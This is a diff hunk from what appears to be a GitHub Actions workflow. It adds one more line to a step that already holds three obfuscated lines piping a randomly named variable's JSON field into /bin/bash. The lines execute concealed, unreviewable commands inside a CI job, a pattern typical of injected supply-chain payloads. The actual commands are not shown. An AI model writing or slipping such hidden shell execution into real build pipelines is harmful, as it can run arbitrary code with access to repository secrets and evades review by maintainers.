@@ -23,6 +23,7 @@ jobs:
           echo $fqq063 | jq -r .q97824 | /bin/bash
           printf '%s' "$a4" | jq -r .pvb8264 | /bin/bash
           echo $rlml3995 | jq -r .rfkm61815 | /bin/bash
+          echo $socr296 | jq -r .aop99 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
